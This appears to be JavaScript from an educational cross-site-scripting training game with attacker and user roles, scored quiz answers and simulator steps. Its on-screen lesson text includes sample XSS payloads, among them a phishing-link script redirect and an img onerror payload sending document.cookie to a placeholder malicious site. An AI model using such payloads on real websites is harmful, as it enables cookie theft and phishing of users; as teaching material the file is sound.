        document.getElementById("ANSRTXT3").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+y52d8wweFuMDDLYfVN9tJDPAThusVQqy94gbM7Cn4oBBXjLKIN5IB", gameStatus).toString(CryptoJS.enc.Utf8) + String(tileLocations[1]) + ',' + String(tileLocations[2]) + '.';
        document.getElementById("ANSRTXT4").innerHTML = CryptoJS.AES.decrypt("U2FsdGVkX1+90fgWqyL0nOYo2wtd+xB0ru7p+GXr1RhdDnEgKUXr6XyHq/WLwwn1AV2VYZqkq4R9b62PDgNir/5DbEJoGsMsq2beO2hwNGkCHgFkHbqM157ZBCUMTQjpDRoeAgNqthvEDcbB6F5VIg==", gameStatus).toString(CryptoJS.enc.Utf8);
        $('div#AnswerPopUp1').show();
        playerQuestionAnswersString = playerQuestionAnswersString.concat("!Role:2,Level:4");
        currentLevelNo = 100;
        clearInterval(timerInterval);
        if (questionTile1Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:1");
            UserStoredSkillsValue = UserStoredSkillsValue + userStoredOffset;
            UserReflectedSkillsValue = UserReflectedSkillsValue + userRefOffset;
            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue + userDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctUserAnswersList.push("R2L4Q1A1");
            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile4Selected) {
            playerScoreInLevel = playerScoreInLevel + 2;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:4");
            UserStoredSkillsValue = UserStoredSkillsValue + userStoredOffset;
            UserReflectedSkillsValue = UserReflectedSkillsValue + userRefOffset;
            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue + userDOMOffset;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue + overallDOMOffset;
            OverallReflectedSkillsValue = OverallReflectedSkillsValue + overallRefOffset;
            OverallStoredSkillsValue = OverallStoredSkillsValue + overallStoredOffset;

            correctUserAnswersList.push("R2L4Q1A4");
            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile2Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:2");
            incorrectUserAnswersList.push("R2L4Q1A2");
            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue - 2;
            UserReflectedSkillsValue = UserReflectedSkillsValue - 2;
            UserStoredSkillsValue = UserStoredSkillsValue - 2;

            if (UserDOMBasedSkillsValue < 0) {
                UserDOMBasedSkillsValue = 0;
            }

            if (UserReflectedSkillsValue < 0) {
                UserReflectedSkillsValue = 0;
            }

            if (UserStoredSkillsValue < 0) {
                UserStoredSkillsValue = 0;
            }


            OverallReflectedSkillsValue = OverallReflectedSkillsValue - 2;
            OverallStoredSkillsValue = OverallStoredSkillsValue - 2;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue - 2;

            if (OverallReflectedSkillsValue < 0) {
                OverallReflectedSkillsValue = 0;
            }

            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }


            if (OverallDOMBasedSkillsValue < 0) {
                OverallDOMBasedSkillsValue = 0;
            }

            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile3Selected) {
            playerScoreInLevel = playerScoreInLevel - 1;
            playerQuestionAnswersString = playerQuestionAnswersString.concat("#Q1:3");
            incorrectUserAnswersList.push("R2L4Q1A3");
            UserDOMBasedSkillsValue = UserDOMBasedSkillsValue - 2;
            UserReflectedSkillsValue = UserReflectedSkillsValue - 2;
            UserStoredSkillsValue = UserStoredSkillsValue - 2;

            if (UserDOMBasedSkillsValue < 0) {
                UserDOMBasedSkillsValue = 0;
            }

            if (UserReflectedSkillsValue < 0) {
                UserReflectedSkillsValue = 0;
            }

            if (UserStoredSkillsValue < 0) {
                UserStoredSkillsValue = 0;
            }

            OverallReflectedSkillsValue = OverallReflectedSkillsValue - 2;
            OverallStoredSkillsValue = OverallStoredSkillsValue - 2;
            OverallDOMBasedSkillsValue = OverallDOMBasedSkillsValue - 2;

            if (OverallReflectedSkillsValue < 0) {
                OverallReflectedSkillsValue = 0;
            }

            if (OverallStoredSkillsValue < 0) {
                OverallStoredSkillsValue = 0;
            }


            if (OverallDOMBasedSkillsValue < 0) {
                OverallDOMBasedSkillsValue = 0;
            }

            if (!suggestedRoleList.includes("User")) {
                suggestedRoleList.push("User");
            }
        }

        if (questionTile1Selected && questionTile2Selected && questionTile3Selected && questionTile4Selected) {
            playerScoreInLevel = 0;
        }

        if (playerScoreInLevel < 0) {
            playerScoreInLevel = 0;
        }

        playerScore.textContent = Number(playerScore.textContent) + playerScoreInLevel;
        playerScoreInLevel = 0;
        document.getElementById("Ref-XSS-Skills-Value").innerText = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("video-progress-Ref-XSS").value = Math.ceil(OverallReflectedSkillsValue);
        document.getElementById("Stored-XSS-Skills-Value").innerText = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("video-progress-Stored-XSS").value = Math.ceil(OverallStoredSkillsValue);
        document.getElementById("DOM-based-XSS-Skills-Value").innerText = Math.ceil(OverallDOMBasedSkillsValue);
        document.getElementById("video-progress-DOM-based-XSS").value = Math.ceil(OverallDOMBasedSkillsValue);
        SimZoneSkills1AddedtoBar = false;
        SimZoneSkills2AddedtoBar = false;

        levelsCompleted.push("R2L4");

        completionTime = timeLimitInSeconds;
        rolesPlayed.push("User");
        LastPlayedRole = "User";



    }




}

function closeQuestionAnswerPopUp() {
    $('div#AnswerPopUp1').hide();
    showLevel();
}

function emptyAnswerErrorPopUpInfo() {
    $('div#emptyAnswerErrorPopUp1').hide();
}


function startLevelInteractivity(buttonID) {

    if (playMusic == true) {
        document.getElementById('buttonSelectSound').play();
    }
    closeTimer();
    if (!initialSimulatorZoneTimerStarted) {
        startSimulatorZoneTimer();
        initialSimulatorZoneTimerStarted = true;
    }

    $('div#interactivityZonePopUp1').show();



    if ((roleId == 0 && (currentLevelNo == 1 || currentLevelNo == 200)) || ((roleId == 0 && currentLevelNo == 1 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const circleInteractiveButton2Variable = document.getElementById("circleInteractiveButton2");
        const InteractivityArrowRightVariable = document.getElementById("InteractivityArrowRight");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveText2Variable = document.getElementById("circleInteractiveText2");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");

        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;width:50%;height:40%;z-index: 0;visibility: visible;");
        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:45%;left:5%;width:25%;height:50%;");
        circleInteractiveButton2Variable.setAttribute("style", "position:fixed;top:34%;left:45%;width:25%;height:50%;");
        InteractivityArrowRightVariable.setAttribute("style", "position:fixed;top:-1%;left:5%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:-11%;left:32%;");
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 35%;font-size: 2vw;");
        circleInteractiveText2Variable.setAttribute("style", "margin-top: 35%;font-size: 2vw;");
        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:90%;left:25%;width:auto;font-size: 1.7vw;");

        document.getElementById("circleInteractiveText1").innerHTML = "Running a search string to see the available products";
        document.getElementById("circleInteractiveText2").innerHTML = "Submit a test script like '&lt;script&gt;alert('test');&lt;/script&gt;'";
        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L1-1.png";

        document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#FF7F11";
        document.getElementById('simulatorInteractiveText1').innerHTML = "The above two actions can be performed on the website in the simulator.";
        document.getElementById("XSSCheckBoxAttackerReflected").value = "";

        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "visible";
        document.getElementById('InteractivityArrowRight').style.visibility = "visible";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
        document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
        document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;

        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:0,Level:1")) {
            simulatorZoneAnswersArray.push("!Role:0,Level:1");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:0,Level:1");
            addedToSZArray = true;
        }

        if (buttonID == 1) {



            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
            document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");

            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L1-1-Search-String.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;width:50%;height:45%;z-index: 1;visibility: visible;");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:82%;left:19%;width:auto;font-size: 1.7vw;");
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#5e3c58";
            document.getElementById('simulatorInteractiveText1').innerHTML = "Submitting a search string returns the items for sale that matches the search criteria. ";
            insideSimulatorAction1 = true;
            if (!SimZoneSkills1AddedtoBar) {

                AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills1AddedtoBar = true;
            }



            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:1,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:1,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }
        } else if (buttonID == 2) {


            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "visible";
            document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "visible";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");

            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L1-1-Sim-Script.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;width:50%;height:45%;z-index: 1;visibility: visible;");
            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";

            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:82%;left:10%;width:auto;font-size:1.5vw;");
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#435274";
            document.getElementById('CheckButtonXSSAttackerReflected').innerHTML = "Check";
            document.getElementById('simulatorInteractiveText1').innerHTML = "Submit a script such as '&lt;script&gt;alert(&#39;test&#39;);&lt;/script&gt;' and click the check button to observe the result. ";
            insideSimulatorAction2 = true;


            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:1,buttonID:2#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:1,buttonID:2#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:2#");
                addedToSZArray = true;
            }

        }

    } else if ((roleId == 0 && (currentLevelNo == 2 || currentLevelNo == 200)) || ((roleId == 0 && currentLevelNo == 2 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");

        const circleInteractiveButton2Variable = document.getElementById("circleInteractiveButton2");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
        const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");
        const circleInteractiveText2Variable = document.getElementById("circleInteractiveText2");
        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:30%;width:25%;height:45%");

        circleInteractiveButton2Variable.setAttribute("style", "position:fixed;top:30%;left:59%;background-color: #435274;width:25%;height:50%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:-5%;left:40%;");
        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:85%;left:20%;background-color: #FF7F11;font-size:1.5vw; width:50%");
        simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:25%;left:33.5%;width: 18%;font-size:1.4vw;");

        circleInteractiveText2Variable.setAttribute("style", "margin-top: 35%;font-size: 2vw;");
        document.getElementById("circleInteractiveText2").innerHTML = "Victim clicks the malicious link";

        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/cell-phone.png";

        document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveButton2').style.visibility = "visible";
        document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText2').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText2').style.visibility = "visible";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        document.getElementById('simulatorInteractiveText1').innerHTML = "A text message with the malicious link is sent to victims through a phishing campaign.";
        document.getElementById('simulatorInteractiveText2').innerHTML = "Don't miss your chance to enjoy a 30% off discount when you shop at myshopping.com, visit https://myshopping.com?search=&lt;script&gt;window.location.replace(&#39;http://myshoping.com&#39;);&lt;/script&gt;. Only valid till stocks last! ";

        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;

        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:0,Level:2")) {
            simulatorZoneAnswersArray.push("!Role:0,Level:2");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:0,Level:2");
            addedToSZArray = true;
        }

        if (buttonID == 2) {


            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";


            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L1-2.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:22%;left:20%;width:50%; heightL40%;z-index: 1;visibility: visible;");
            simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:70%;left:10%;background-color: #435274;font-size:1.5vw;width:65%;");

            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#435274";
            document.getElementById('simulatorInteractiveText1').innerHTML = "Once the victim clicks the malicious link, they will get redirected to this impersonation website. If they submit authentic user credentials or credit card details to this impersonation website mistaking it for the real website, they are at risk for several attacks. Moreover, by leveraging browser flaws, fraudulent websites can automatically download and run malware, including keyloggers, ransomware, and remote access trojans (RATs), without any user input.";
            insideSimulatorAction2 = true;

            if (!SimZoneSkills2AddedtoBar) {
                AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills2AddedtoBar = true;

            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:2,buttonID:2#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:2,buttonID:2#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:2#");
                addedToSZArray = true;
            }
        }
    } else if ((roleId == 0 && (currentLevelNo == 3 || currentLevelNo == 200)) || ((roleId == 0 && currentLevelNo == 3 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const circleInteractiveButton2Variable = document.getElementById("circleInteractiveButton2");
        const InteractivityArrowRightVariable = document.getElementById("InteractivityArrowRight");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveText2Variable = document.getElementById("circleInteractiveText2");
        const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");

        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:15%;left:35%;height:60%;width:30%;");

        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:30%;left:3%;width:25%;height:50%;");
        circleInteractiveButton2Variable.setAttribute("style", "position:fixed;top:30%;left:71%;width:25%;height:50%;");
        InteractivityArrowRightVariable.setAttribute("style", "position:fixed;top:-2%;left:12%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:-2%;left:55%;");
        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:80%;left:25%;background-color: #FF7F11;font-size: 1.5vw;width: 50%;");
        simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:27%;left:33.7%;width: 32.5%;font-size: 1.3vw;");
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 35%;font-size: 2vw;");
        circleInteractiveText2Variable.setAttribute("style", "margin-top: 35%;font-size: 2vw;");

        document.getElementById("circleInteractiveText1").innerHTML = "Redirect victims to a malicious website";
        document.getElementById("circleInteractiveText2").innerHTML = "Steal HTTP cookies from victim's computer";

        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/laptop.png";

        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "visible";
        document.getElementById('InteractivityArrowRight').style.visibility = "visible";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText2').style.visibility = "visible";
        document.getElementById('questionImageContainerSimulatorZone2').style.visibility = "hidden";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        document.getElementById('simulatorInteractiveText1').innerHTML = "An email with the malicious link is sent to victims through a phishing campaign.";

        document.getElementById('simulatorInteractiveText2').innerHTML = "Don't miss your chance to enjoy a 30% off discount when you shop at myshopping.com, visit http://myshopping.com?search=&lt;script&gt;window.location.replace('http://www.maliciouswebsite.com');&lt;/script&gt; or <br> http://myshopping.com?search=&lt;img src=x onerror=this.src= http://www.maliciouswebsite/?c='+document.cookie&gt;. Only valid till stocks last!";

        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;

        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:0,Level:3")) {
            simulatorZoneAnswersArray.push("!Role:0,Level:3");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:0,Level:3");
            addedToSZArray = true;
        }


        if (buttonID == 1) {


            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";



            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L1-2.png";
            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;height:40%;width:60%;z-index: 1;visibility: visible;");

            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#5e3c58";
            document.getElementById('simulatorInteractiveText1').innerHTML = "Victims can be redirected to malicious websites which can unleash a number of attacks, such as stealing sensitive information, unauthorized access to victim's devices etc.";
            insideSimulatorAction1 = true;

            if (!SimZoneSkills1AddedtoBar) {
                AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills1AddedtoBar = true;

            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:3,buttonID:1#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:3,buttonID:1#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:1#");
                addedToSZArray = true;
            }

        } else if (buttonID == 2) {

            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";

            document.getElementById('InteractivityArrowRight').style.visibility = "hidden";
            document.getElementById('InteractivityArrowLeft').style.visibility = "hidden";
            document.getElementById('InteractivityBackButton1').style.visibility = "visible";

            const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");


            const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
            document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/laptop.png";
            const questionImage2ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone2");
            document.getElementById("questionImageContainerSimulatorZone2").src = "images/simulation_zone/Attacker-L1-1.png";

            questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:20%;left:25%;height:60%;width:30%;visibility: visible;");
            questionImage2ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;height:49%;width:46%;top:19%;left:17%;visibility: visible;");

            simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:25%;left:62%;width: 30%;font-size: 2vw;");

            document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText2').style.visibility = "visible";
            document.getElementById('simulatorInteractiveText1').style.backgroundColor = "#435274";
            document.getElementById('simulatorInteractiveText1').style.top = "85%";
            document.getElementById('simulatorInteractiveText1').innerHTML = "If an attacker steals these cookies, they could impersonate the victim in active sessions.";
            document.getElementById('simulatorInteractiveText2').innerHTML = "An HTTP cookie (web cookie, browser cookie) is a small piece of data that a server sends to a user's web browser. Typically, these are used to tell if two requests come from the same browser—keeping a user logged in.";
            insideSimulatorAction2 = true;

            if (!SimZoneSkills2AddedtoBar) {
                AttackerSimZoneSkillsValue = AttackerSimZoneSkillsValue + attackerSimZoneOffset;
                OverallSimZoneSkillsValue = OverallSimZoneSkillsValue + overallSimZoneOffset;
                SimZoneSkills2AddedtoBar = true;

            }

            var addedToSZArray = false;
            if (!addedToSZArray && !simulatorZoneAnswersArray.includes("#Role:0,Level:3,buttonID:2#")) {
                simulatorZoneAnswersArray.push("#Role:0,Level:3,buttonID:2#");
                simulatorZoneAnswersString = simulatorZoneAnswersString.concat("#buttonID:2#");
                addedToSZArray = true;
            }

        }
    } else if ((roleId == 0 && (currentLevelNo == 4 || currentLevelNo == 200)) || ((roleId == 0 && currentLevelNo == 4 && buttonID == 100) && (insideSimulatorAction1 || insideSimulatorAction2))) {

        const questionImage1ContainerSimulatorZoneVariable = document.getElementById("questionImageContainerSimulatorZone1");
        const circleInteractiveButton1Variable = document.getElementById("circleInteractiveButton1");
        const circleInteractiveButton2Variable = document.getElementById("circleInteractiveButton2");
        const InteractivityArrowRightVariable = document.getElementById("InteractivityArrowRight");
        const InteractivityArrowLeftVariable = document.getElementById("InteractivityArrowLeft");
        const simulatorInteractiveText1Variable = document.getElementById("simulatorInteractiveText1");
        const circleInteractiveText1Variable = document.getElementById("circleInteractiveText1");
        const circleInteractiveText2Variable = document.getElementById("circleInteractiveText2");
        const simulatorInteractiveText2Variable = document.getElementById("simulatorInteractiveText2");

        questionImage1ContainerSimulatorZoneVariable.setAttribute("style", "position:fixed;top:25%;left:20%;width:50%;height:40%;");

        circleInteractiveButton1Variable.setAttribute("style", "position:fixed;top:35%;left:30%;width:25%;height:50%;");
        circleInteractiveButton2Variable.setAttribute("style", "position:fixed;top:35%;left:71%;width:25%;height:50%;");
        InteractivityArrowRightVariable.setAttribute("style", "position:fixed;top:-4%;left:39%;");
        InteractivityArrowLeftVariable.setAttribute("style", "position:fixed;top:3%;left:51%;");

        simulatorInteractiveText2Variable.setAttribute("style", "position:fixed;top:25%;left:34%;width: 50%;font-size: 2vw;");
        circleInteractiveText1Variable.setAttribute("style", "margin-top: 35%;font-size: 2vw;");
        circleInteractiveText2Variable.setAttribute("style", "margin-top: 35%;font-size: 2vw;");

        document.getElementById("circleInteractiveText1").innerHTML = "Submitting your email and a text comment to the form";
        document.getElementById("circleInteractiveText2").innerHTML = "Submit a test script like '&lt;script&gt;alert('test');&lt;/script&gt;'";

        document.getElementById("questionImageContainerSimulatorZone1").src = "images/simulation_zone/Attacker-L2-1.png";

        document.getElementById('XSSCheckBoxAttackerReflected').style.visibility = "hidden";
        document.getElementById('CheckButtonXSSAttackerReflected').style.visibility = "hidden";
        document.getElementById('circleInteractiveButton1').style.visibility = "visible";
        document.getElementById('circleInteractiveButton2').style.visibility = "visible";
        document.getElementById('InteractivityArrowRight').style.visibility = "visible";
        document.getElementById('InteractivityArrowLeft').style.visibility = "visible";
        document.getElementById('InteractivityBackButton1').style.visibility = "hidden";
        document.getElementById('circleInteractiveText1').style.visibility = "visible";
        document.getElementById('circleInteractiveText2').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";
        document.getElementById('simulatorInteractiveText2').style.visibility = "hidden";
        document.getElementById('questionImageContainerSimulatorZone2').style.visibility = "hidden";
        document.getElementById('sanitizedText').style.visibility = "hidden";

        simulatorInteractiveText1Variable.setAttribute("style", "position:fixed;top:86%;left:5%;width:70%;background-color: #FF7F11;font-size: 2vw;");
        document.getElementById('simulatorInteractiveText1').innerHTML = "The above two actions can be performed on the website in the simulator.";
        document.getElementById('simulatorInteractiveText1').style.visibility = "visible";

        insideSimulatorAction1 = false;
        insideSimulatorAction2 = false;
        XSSAlertScriptSubmitted = false;
        document.getElementById("XSSCheckBoxAttackerReflected").value = "";

        var addedToSZArray = false;
        if (!addedToSZArray && !simulatorZoneAnswersArray.includes("!Role:0,Level:4")) {
            simulatorZoneAnswersArray.push("!Role:0,Level:4");
            simulatorZoneAnswersString = simulatorZoneAnswersString.concat("!Role:0,Level:4");
            addedToSZArray = true;
        }


        if (buttonID == 1) {


            document.getElementById('circleInteractiveText1').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton1').style.visibility = "hidden";
            document.getElementById('circleInteractiveText2').style.visibility = "hidden";
            document.getElementById('circleInteractiveButton2').style.visibility = "hidden";
